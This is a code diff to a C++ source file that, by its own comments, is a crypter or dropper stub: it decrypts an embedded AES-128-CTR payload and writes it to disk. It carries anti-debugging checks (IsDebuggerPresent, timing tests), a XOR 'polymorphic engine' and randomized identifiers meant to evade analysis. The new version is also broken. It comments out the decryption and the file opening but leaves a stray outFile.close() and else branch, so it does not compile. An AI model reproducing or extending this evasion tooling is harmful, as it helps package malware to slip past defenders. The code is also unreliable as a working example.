@@ -6,31 +6,23 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <random>
 #include <ctime>
+#include <chrono>
+#include <thread>
 
-// Advanced obfuscation
-std::string keoZlV1L = "\x33\x39\x33\x39\x30\x38\x30\x66\x30\x66\x33\x38\x30\x38\x33\x31\x33\x38\x33\x32\x33\x38\x33\x39\x33\x39\x30\x38\x30\x66\x30\x66";
-std::string h8QcLI68 = "\x35\x31\x62\x36\x62\x37\x32\x34\x38\x64\x34\x32\x35\x33\x39\x30\x38\x39\x38\x65\x61\x66\x62\x63\x34\x35\x39\x61\x63\x62\x61\x38";
+// Standalone Advanced Stub - Anti-debugging + Polymorphism
+const std::string KEY_O0nHyGAp = "ebf9000410c28b5a72bba404867b1bbe";
+const std::string NONCE_pTVFmxRN = "c2f6f115f8c5b3fb8f631b3fb462b05f";
 
-// Anti-debugging and obfuscation techniques
-bool isDebugged() {
-    // Simple timing check
-    clock_t start = clock();
-    for (volatile int i = 0; i < 1000000; i++) {}
-    clock_t end = clock();
-    return (end - start) > 100000; // Suspicious if too slow
-}
-
-// Polymorphic code mutation engine
+// Anti-debugging and polymorphic features
 class PolymorphicEngine {
 private:
     static const uint32_t POLY_KEY = 0xDEADBEEF;
     
 public:
-    static uint8_t mutateByte(uint8_t input, uint32_t seed) {
-        // Deterministic polymorphic transformation
-        uint32_t mutation = seed ^ POLY_KEY;
-        return input ^ (mutation & 0xFF);
+    static uint8_t mutateByte(uint8_t byte, uint32_t seed) {
+        return byte ^ ((seed * POLY_KEY) & 0xFF);
     }
     
     static void mutateArray(uint8_t* data, size_t size, uint32_t seed) {
@@ -40,14 +32,28 @@ public:
     }
     
     static void demutateArray(uint8_t* data, size_t size, uint32_t seed) {
-        // Reverse the mutation (same operation)
-        for (size_t i = 0; i < size; i++) {
-            data[i] = mutateByte(data[i], seed + i);
-        }
+        mutateArray(data, size, seed); // XOR is symmetric
     }
 };
 
-// AES-128-CTR implementation (same as native_encryptor/dropper)
+// Anti-debugging checks
+bool isDebuggerPresent() {
+    #ifdef _WIN32
+    return IsDebuggerPresent();
+    #else
+    return false;
+    #endif
+}
+
+bool checkTiming() {
+    auto start = std::chrono::high_resolution_clock::now();
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    auto end = std::chrono::high_resolution_clock::now();
+    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
+    return duration.count() < 95; // If too fast, likely debugger
+}
+
+// AES-128-CTR implementation (same as basic)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -67,10 +73,7 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
-static const uint8_t rcon[10] = {
-    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
-};
-
+// AES helper functions (same as basic)
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -193,40 +196,43 @@ void hexToBytes(const std::string& hex, uint8_t* bytes) {
 }
 
 int main() {
-    if (isDebugged()) {
-        std::cerr << "Debugging detected!" << std::endl;
+    // Anti-debugging checks
+    if (isDebuggerPresent() || checkTiming()) {
+        return 1; // Exit if debugger detected
+    }
+    
+    // Standalone stub - no embedded data
+    // Standalone stub - no embedded data}
+    
+    // Convert hex strings to bytes
+    uint8_t key[16], nonce[16];
+    hexToBytes(KEY_O0nHyGAp, key);
+    hexToBytes(NONCE_pTVFmxRN, nonce);
+    
+    // Polymorphic mutation/demutation
+    uint32_t seed = std::time(nullptr);
+    PolymorphicEngine::mutateArray(key, 16, seed);
+    PolymorphicEngine::mutateArray(nonce, 16, seed);
+    
+    // Decrypt the data using AES-128-CTR
+    // Note: embeddedData and embeddedDataSize will be added by stub linker
+    // aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+    
+    // Demutate the key and nonce
+    PolymorphicEngine::demutateArray(key, 16, seed);
+    PolymorphicEngine::demutateArray(nonce, 16, seed);
+    
+    // Write decrypted data to file
+    // Note: embeddedData and embeddedDataSize will be added by stub linker
+    // std::ofstream outFile("decrypted_output.bin", std::ios::binary);
+    // if (outFile.is_open()) {
+    //     outFile.write(reinterpret_cast<char*>(embeddedData), embeddedDataSize);
+        outFile.close();
+        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    } else {
+        std::cerr << "Failed to create output file" << std::endl;
         return 1;
     }
     
-    // Embedded encrypted data
-    uint8_t encryptedData[] = {0xa9, 0xe5, 0x0e, 0x8c, 0x90, 0xfc, 0x62, 0x15, 0x8c, 0xb0, 0x70, 0xaa, 0x88, 0x54, 0x6e, 0xd5, 0xac, 0x0e, 0x50, 0x0c, 0xed, 0xa6, 0x23, 0xc3, 0x54, 0x47, 0x17, 0xf5, 0xdb, 0xc0, 0x3f, 0xfe, 0xf2, 0x07, 0x11, 0x58, 0x89, 0xfb, 0x43, 0x53, 0x4b, 0xb1, 0x11, 0x42, 0xdb, 0xd2, 0x11, 0x2d, 0x9f, 0x30, 0xbe, 0x67, 0xc0, 0x36, 0x43, 0xb3, 0x07, 0xab, 0x29, 0x39, 0x96, 0xc5, 0x3b, 0xf6, 0xe6, 0x18, 0xd6, 0x51, 0x02, 0xad, 0x4e, 0x63, 0x89, 0x22, 0x60, 0xf3, 0xaa, 0xf6, 0x97, 0xb0, 0xc1, 0x2c, 0xa4, 0x8b, 0x7d, 0x81, 0x8e, 0x5b, 0xe4, 0x38, 0xa8, 0x94, 0x31, 0x16, 0x8d, 0x11, 0xd7, 0x87, 0xab, 0x13, 0x2e, 0x80, 0xd4, 0x52, 0xc3, 0x1d, 0x0e, 0xed, 0x83, 0x4a, 0xbe, 0x2c, 0xaa, 0x50, 0x6a, 0x3c, 0x0c, 0x25, 0x4b, 0xae, 0x08, 0x5e, 0xdc, 0x7a, 0xc2};
-    size_t dataSize = sizeof(encryptedData);
-    
-    // Key and nonce
-    std::string keyHex = keoZlV1L;
-    std::string nonceHex = h8QcLI68;
-    uint8_t key[16], nonce[16];
-    hexToBytes(keyHex, key);
-    hexToBytes(nonceHex, nonce);
-    
-    // Apply polymorphic mutation to key and nonce
-    uint32_t polySeed = std::time(nullptr) ^ 0xDEADBEEF;
-    PolymorphicEngine::mutateArray(key, 16, polySeed);
-    PolymorphicEngine::mutateArray(nonce, 16, polySeed + 1);
-    
-    // Demutate before use
-    PolymorphicEngine::demutateArray(key, 16, polySeed);
-    PolymorphicEngine::demutateArray(nonce, 16, polySeed + 1);
-    
-    // Decrypt
-    std::vector<uint8_t> decrypted(dataSize);
-    aesCtrCrypt(encryptedData, decrypted.data(), dataSize, key, nonce);
-    
-    // Write decrypted data to output file
-    std::string filename = "output_" + std::to_string(std::time(nullptr)) + ".bin";
-    std::ofstream outFile(filename, std::ios::binary);
-    outFile.write(reinterpret_cast<char*>(decrypted.data()), dataSize);
-    outFile.close();
-    std::cout << "Decrypted file written: " << filename << std::endl;
     return 0;
 }
